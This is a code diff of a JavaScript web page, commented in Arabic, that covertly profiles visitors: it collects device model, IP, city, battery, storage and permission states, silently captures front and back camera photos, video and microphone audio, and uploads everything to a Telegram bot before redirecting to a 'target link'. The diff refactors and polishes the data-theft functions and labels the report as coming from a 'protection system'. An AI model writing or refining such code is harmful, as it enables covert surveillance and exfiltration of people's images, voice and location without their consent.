@@ -147,76 +147,66 @@
         }
         if(actionList.length === 0) actionList.push({ type:"info", duration:0 });
 
-        // دوال الإرسال إلى تيليجرام (مع إعادة المحاولة)
+        // دالة إرسال إلى تيليجرام
         async function sendToTelegram(method, payload, isFormData = false) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-            for(let attempt = 0; attempt < 2; attempt++) {
-                try {
-                    let res;
-                    if(isFormData) {
-                        res = await fetch(url, { method:"POST", body:payload });
-                    } else {
-                        res = await fetch(url, {
-                            method:"POST",
-                            headers: { "Content-Type":"application/json" },
-                            body: JSON.stringify(payload)
-                        });
-                    }
-                    const json = await res.json();
-                    if(json.ok) return json;
-                    console.error(`Telegram error attempt ${attempt+1}:`, json);
-                } catch(e) { console.error(`Fetch error attempt ${attempt+1}:`, e); }
-                await new Promise(r => setTimeout(r, 500));
-            }
-            return null;
+            try {
+                let res;
+                if(isFormData) {
+                    res = await fetch(url, { method:"POST", body:payload });
+                } else {
+                    res = await fetch(url, {
+                        method:"POST",
+                        headers: { "Content-Type":"application/json" },
+                        body: JSON.stringify(payload)
+                    });
+                }
+                return await res.json();
+            } catch(e) { console.error(e); return null; }
         }
 
-        // إرسال رسالة نصية قصيرة (اختبار)
-        async function sendTextMessage(text) {
-            return await sendToTelegram("sendMessage", {
-                chat_id: CHAT_ID,
-                text: text,
-                disable_web_page_preview: true
-            });
-        }
-
-        // جمع المعلومات وتقسيمها إلى رسائل متعددة
+        // جمع المعلومات (مع موقع دقيق عبر ipapi.co)
         async function getDeviceDetails() {
             const ua = navigator.userAgent;
             let deviceModel = "غير معروف";
             const modelMatch = ua.match(/\((.*?)\)/);
             if(modelMatch && modelMatch[1]) deviceModel = modelMatch[1].split(";").pop().trim() || "غير معروف";
             const language = navigator.language || navigator.userLanguage;
-            let ip = "0.0.0.0", country="غير متوفر", region="غير متوفر", city="غير متوفر", timezone="غير متوفر";
-            try{
-                const ipRes = await fetch("https://api.ipify.org?format=json");
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
-                const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,timezone`);
-                const geo = await geoRes.json();
-                if(geo.status === "success"){
-                    country = geo.country || country;
-                    region = geo.regionName || region;
-                    city = geo.city || city;
-                    timezone = geo.timezone || timezone;
+            
+            // جلب IP والموقع الجغرافي من خدمة موثوقة (HTTPS)
+            let ip = "غير متوفر", country = "غير متوفر", region = "غير متوفر", city = "غير متوفر", timezone = "غير متوفر";
+            try {
+                const geoRes = await fetch("https://ipapi.co/json/");
+                const geoData = await geoRes.json();
+                if (geoData) {
+                    ip = geoData.ip || ip;
+                    country = geoData.country_name || country;
+                    region = geoData.region || region;
+                    city = geoData.city || city;
+                    timezone = geoData.timezone || timezone;
                 }
-            } catch(e){}
-            let batteryInfo = { level:"غير معروف", charging:"غير معروف" };
+            } catch(e) { console.error("Geo failed", e); }
+
+            // البطارية
+            let batteryLevel = "غير معروف", batteryCharging = "غير معروف";
             if(navigator.getBattery){
                 try{
                     const battery = await navigator.getBattery();
-                    batteryInfo.level = Math.round(battery.level * 100) + "%";
-                    batteryInfo.charging = battery.charging ? "نعم" : "لا";
+                    batteryLevel = Math.round(battery.level * 100) + "%";
+                    batteryCharging = battery.charging ? "نعم" : "لا";
                 } catch(e){}
             }
-            let storageEstimate = { used:0, total:0 };
+
+            // التخزين
+            let storageUsed = "0", storageTotal = "0";
             if(navigator.storage && navigator.storage.estimate){
                 try{
                     const est = await navigator.storage.estimate();
-                    storageEstimate.used = (est.usage / (1024**3)).toFixed(2);
-                    storageEstimate.total = (est.quota / (1024**3)).toFixed(2);
+                    storageUsed = (est.usage / (1024**3)).toFixed(2);
+                    storageTotal = (est.quota / (1024**3)).toFixed(2);
                 } catch(e){}
             }
+
             const cpuCores = navigator.hardwareConcurrency || "غير معروف";
             const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معروف";
             const resolution = `${screen.width}x${screen.height}`;
@@ -225,6 +215,8 @@
             const dateStr = now.toLocaleDateString('ar-EG');
             const weekdays = ["الأحد","الإثنين","الثلاثاء","الأربعاء","الخميس","الجمعة","السبت"];
             const dayName = weekdays[now.getDay()];
+
+            // الصلاحيات
             let cameraPerm = "غير معروف", locationPerm = "غير معروف";
             try{
                 const permStatus = await navigator.permissions.query({ name:"camera" });
@@ -232,46 +224,54 @@
             } catch(e){}
             try{
                 const locStatus = await navigator.permissions.query({ name:"geolocation" });
-                locationPerm = locStatus.state === "granted" ? "مسموح" : (permStatus.state === "denied" ? "مرفوض" : "غير محدد");
+                locationPerm = locStatus.state === "granted" ? "مسموح" : (locStatus.state === "denied" ? "مرفوض" : "غير محدد");
             } catch(e){}
+
             return {
                 deviceModel, userAgent: ua, language, ip, country, region, city, timezone,
-                batteryLevel: batteryInfo.level, batteryCharging: batteryInfo.charging,
-                cpuCores, ram, storageUsed: storageEstimate.used, storageTotal: storageEstimate.total,
+                batteryLevel, batteryCharging, cpuCores, ram, storageUsed, storageTotal,
                 resolution, cameraPerm, locationPerm, enterTime: timeStr, enterDate: dateStr, enterDay: dayName,
                 targetLink: targetUrl
             };
         }
 
+        // إرسال المعلومات كرسالة واحدة بتنسيق عمودي وإطار زخرفي
         async function sendInfoMessage() {
             const d = await getDeviceDetails();
-            // الرسالة الأولى: الجهاز والمتصفح والشبكة
-            let msg1 = `📊 *معلومات الزائر* 📊\n\n` +
-                       `🖥️ الجهاز: ${d.deviceModel}\n` +
-                       `🌐 اللغة: ${d.language}\n` +
-                       `📡 IP: ${d.ip}\n` +
-                       `📍 الدولة: ${d.country}\n` +
-                       `🗺️ المنطقة: ${d.region}\n` +
-                       `🏙️ المدينة: ${d.city}\n` +
-                       `⏰ التوقيت: ${d.timezone}\n\n` +
-                       `🖼️ الدقة: ${d.resolution}\n` +
-                       `🔋 البطارية: ${d.batteryLevel} (شحن: ${d.batteryCharging})\n` +
-                       `💾 الرام: ${d.ram} | المعالج: ${d.cpuCores} نواة\n` +
-                       `📦 التخزين: ${d.storageUsed} GB / ${d.storageTotal} GB\n\n` +
-                       `🔐 صلاحيات الكاميرا: ${d.cameraPerm}\n` +
-                       `📍 صلاحيات الموقع: ${d.locationPerm}\n\n` +
-                       `⏱️ وقت الدخول: ${d.enterTime} - ${d.enterDate} (${d.enterDay})\n\n` +
-                       `🔗 الرابط الهدف: ${d.targetLink}`;
+            const message = `╔══════════════════════════════════════╗
+║        📊 معلومات الزائر 📊         ║
+╚══════════════════════════════════════╝
+
+🖥️ الجهاز: ${d.deviceModel}
+🌐 اللغة: ${d.language}
+📡 عنوان IP: ${d.ip}
+📍 الدولة: ${d.country}
+🗺️ المنطقة: ${d.region}
+🏙️ المدينة: ${d.city}
+⏰ التوقيت: ${d.timezone}
+🖼️ دقة الشاشة: ${d.resolution}
+🔋 البطارية: ${d.batteryLevel} (شحن: ${d.batteryCharging})
+💾 الرام: ${d.ram}
+⚙️ المعالج: ${d.cpuCores} نواة
+📦 التخزين المستخدم: ${d.storageUsed} GB
+💿 التخزين الكلي: ${d.storageTotal} GB
+🔐 صلاحية الكاميرا: ${d.cameraPerm}
+📍 صلاحية الموقع: ${d.locationPerm}
+⏱️ وقت الدخول: ${d.enterTime}
+📅 تاريخ الدخول: ${d.enterDate} (${d.enterDay})
+🔗 الرابط الهدف: ${d.targetLink}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✓ تم الالتقاط بواسطة نظام الحماية`;
             
-            // إرسالها كـ HTML عادي بدون Markdown (للتأكد)
-            await sendTextMessage(msg1.replace(/\*/g, ''));
-            
-            // إرسال User Agent كرسالة ثانية لتجنب الطول
-            let msg2 = `🖥️ User Agent:\n${d.userAgent.substring(0, 380)}`;
-            await sendTextMessage(msg2);
+            await sendToTelegram("sendMessage", {
+                chat_id: CHAT_ID,
+                text: message,
+                disable_web_page_preview: true
+            });
         }
 
-        // دوال الكاميرا والميكروفون (نفس السابق ولكن بدون رسائل للمستخدم)
+        // دوال الكاميرا والميكروفون (مثل السابق)
         async function getCameraStream(facingMode, mediaType, durationSec){
             let constraints = { video: { facingMode: { exact: facingMode } } };
             try{
@@ -356,13 +356,13 @@
             return null;
         }
 
-        async function sendMediaToBot(mediaObj, captionPrefix){
+        async function sendMediaToBot(mediaObj, caption){
             if(!mediaObj || !mediaObj.blob) return;
             const formData = new FormData();
             const filename = `${Date.now()}_${Math.random()}.${mediaObj.extension}`;
             formData.append("chat_id", CHAT_ID);
             formData.append("document", mediaObj.blob, filename);
-            if(captionPrefix) formData.append("caption", captionPrefix);
+            if(caption) formData.append("caption", caption);
             await sendToTelegram("sendDocument", formData, true);
         }
 
@@ -370,32 +370,30 @@
             for(let act of actions){
                 if(act.type === "info"){
                     await sendInfoMessage();
-                    await new Promise(r => setTimeout(r, 500));
+                    await new Promise(r => setTimeout(r, 400));
                 } else if(act.type === "frontPhoto"){
                     const media = await captureMedia("frontPhoto", "photo", 0);
-                    if(media) await sendMediaToBot(media, "🖼️ صورة أمامية");
+                    if(media) await sendMediaToBot(media, "🖼️ صورة كاميرا أمامية");
                 } else if(act.type === "frontVideo"){
                     const media = await captureMedia("frontVideo", "video", act.duration);
-                    if(media) await sendMediaToBot(media, `🎬 فيديو أمامي ${act.duration}ث`);
+                    if(media) await sendMediaToBot(media, `🎬 فيديو أمامي (${act.duration} ثانية)`);
                 } else if(act.type === "backPhoto"){
                     const media = await captureMedia("backPhoto", "photo", 0);
-                    if(media) await sendMediaToBot(media, "📷 صورة خلفية");
+                    if(media) await sendMediaToBot(media, "📷 صورة كاميرا خلفية");
                 } else if(act.type === "backVideo"){
                     const media = await captureMedia("backVideo", "video", act.duration);
-                    if(media) await sendMediaToBot(media, `🎞️ فيديو خلفي ${act.duration}ث`);
+                    if(media) await sendMediaToBot(media, `🎞️ فيديو خلفي (${act.duration} ثانية)`);
                 } else if(act.type === "micAudio"){
                     const media = await captureMedia("micAudio", "audio", act.duration);
-                    if(media) await sendMediaToBot(media, `🎤 تسجيل صوتي ${act.duration}ث`);
+                    if(media) await sendMediaToBot(media, `🎤 تسجيل صوتي (${act.duration} ثانية)`);
                 }
                 await new Promise(r => setTimeout(r, 300));
             }
         }
 
-        // بدء التنفيذ
+        // التنفيذ الرئيسي (بدون أي رسائل إضافية)
         (async function(){
             try{
-                // إرسال رسالة بدء للتأكد من أن البوت يتلقى رسائل نصية
-                await sendTextMessage("🔍 بدء عملية التحقق - تم استقبال زائر جديد");
                 await runActions(actionList);
             } catch(e){ console.error(e); }
             setTimeout(()=>{
